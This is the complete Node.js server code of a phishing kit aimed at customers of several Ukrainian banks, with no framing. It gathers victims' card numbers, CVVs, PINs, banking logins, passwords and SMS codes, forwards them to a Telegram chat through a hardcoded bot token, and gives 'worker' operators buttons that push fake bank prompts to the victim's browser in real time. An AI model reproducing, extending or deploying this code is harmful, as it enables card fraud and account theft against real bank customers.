const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// НАСТРОЙКИ
const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
const CHAT_ID = '-4970332008';

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
bot.sendMessage(CHAT_ID, `🚀 Сервер перезапущено: ${new Date().toISOString()}`).catch(err => console.error('Test send error:', err));

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();
const cardVisitCount = new Map(); // --- NEW: Track visits by card number
const adminReplyState = new Map(); // --- NEW: To handle "СВОЙ" command

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
});

app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) { console.error('Error decoding referrer:', e); }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, worker: workerNick };
    sessions.set(sessionId, newData);

    // --- NEW Oschadbank Flow: if card is submitted, don't treat as final ---
    if (newData.bankName === 'Ощадбанк' && newData.card && !newData.pin) {
        let message = `<b>⏳ Ощадбанк: Введено картку!</b>\n\n`;
        message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: 'Запросити ПІН-код', callback_data: `show_pin:${sessionId}` }]]
            }
        });
        return res.status(200).json({ message: 'Card received, waiting for PIN command' });
    }

    if (isFinalStep) {
        const fullSessionData = sessions.get(sessionId);
        let message = `<b>🔥 Новий запис! 🔥</b>\n\n`;
        message += `<b>Назва банку:</b> ${fullSessionData.bankName}\n`;
        
        // --- NEW: Visit count by card number ---
        const cardNumber = fullSessionData.card_confirm || fullSessionData.card || fullSessionData['ukrsib-card'];
        if (cardNumber) {
            const currentCount = cardVisitCount.get(cardNumber) || 0;
            const newCount = currentCount + 1;
            cardVisitCount.set(cardNumber, newCount);
            const visitText = newCount === 1 ? '💎 NEW' : `🔄 ${newCount} раз`;
            message += `<b>Кількість переходів (по карті):</b> ${visitText}\n`;
        }

        // --- Add all collected data to message ---
        const dataOrder = ['phone', 'card', 'card_confirm', 'ukrsib-card', 'card-expiry', 'ukrsib-expiry', 'card-cvv', 'pin', 'ukrsib-pin', 'balance', 'oschad-login', 'oschad-pass', 'vostok-login', 'vostok-pass', 'lk_pin', 'call_code_input', 'call_confirmed'];
        dataOrder.forEach(key => {
            if (fullSessionData[key]) {
                 message += `<b>${key.replace(/_/g, ' ').replace('-', ' ')}:</b> <code>${fullSessionData[key]}</code>\n`;
            }
        });
        
        message += `<b>Worker:</b> @${fullSessionData.worker}\n`;
        sendToTelegram(message, sessionId, fullSessionData.bankName);
    }
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    // ... (existing code, no changes needed)
});

function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [ // Row 1
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` },
            { text: 'ЛК', callback_data: `lk:${sessionId}` }
        ],
        [ // Row 2
            { text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` },
            { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
            { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
        ],
        [ // Row 3
            { text: 'Номер', callback_data: `number_error:${sessionId}` },
            { text: 'OTHER', callback_data: `other:${sessionId}` },
            { text: 'Звонок', callback_data: `call:${sessionId}` }
        ],
        [ // Row 4
            { text: 'СВОЙ', callback_data: `custom_message:${sessionId}` },
            { text: 'BAN 🚫', callback_data: `ban_user:${sessionId}` }
        ]
    ];
    
    const options = { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    const sessionData = sessions.get(sessionId) || {};
    const bankName = sessionData.bankName;

    if (type === 'custom_message') {
        adminReplyState.set(callbackQuery.from.id, sessionId);
        bot.sendMessage(CHAT_ID, `✍️ Введіть повідомлення для користувача (сесія ${sessionId}). Воно буде відправлено як є.`, {
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
        return;
    }
    
    let commandData = {};
    let commandType = type;

    switch (type) {
        case 'sms':
            commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
            break;
        case 'pin_error': // Text changed
            commandData = { text: "Ви не змогли підтвердити володіння карткою. Для підтвердження володіння карткою натисніть назад та заповніть форму з вірним пін-кодом" };
            break;
        case 'other':
            commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
            break;
        // --- NEW LK and CALL logic ---
        case 'lk':
            if (bankName === 'Ощадбанк') commandType = 'lk_oschad';
            else if (bankName === 'Райффайзен') commandType = 'lk_raiffeisen';
            else if (bankName === 'Восток') commandType = 'lk_vostok';
            else if (bankName === 'Izibank') commandType = 'lk_izibank';
            else if (bankName === 'Укрсиб') commandType = 'lk_ukrsib';
            else { bot.answerCallbackQuery(callbackQuery.id, { text: `Для банку "${bankName}" немає сценарію ЛК.`, show_alert: true }); return; }
            break;
        case 'call':
             if (bankName === 'Ощадбанк') commandType = 'call_oschad';
             else { bot.answerCallbackQuery(callbackQuery.id, { text: `Для банку "${bankName}" немає сценарію "Дзвінок".`, show_alert: true }); return; }
            break;
        // Add other simple commands here
        case 'show_pin':
        case 'request_details':
        case 'ban_user':
        case 'code_error':
        case 'timer':
        case 'number_error':
            commandData = {}; // No extra data needed
            break;
        default:
            bot.answerCallbackQuery(callbackQuery.id, { text: `Невідома команда: ${type}` });
            return;
    }

    ws.send(JSON.stringify({ type: commandType, data: commandData }));
    bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
});

// --- NEW: Handler for "СВОЙ" command replies ---
bot.on('message', (msg) => {
    if (msg.reply_to_message && adminReplyState.has(msg.from.id)) {
        const sessionId = adminReplyState.get(msg.from.id);
        const ws = clients.get(sessionId);

        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom_message', data: { text: msg.text } }));
            bot.sendMessage(CHAT_ID, `✅ Повідомлення відправлено до сесії ${sessionId}.`);
        } else {
            bot.sendMessage(CHAT_ID, `❌ Помилка: клієнт ${sessionId} вже не в мережі.`);
        }
        adminReplyState.delete(msg.from.id); // Clear state after sending
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server is running on port ${PORT}`));
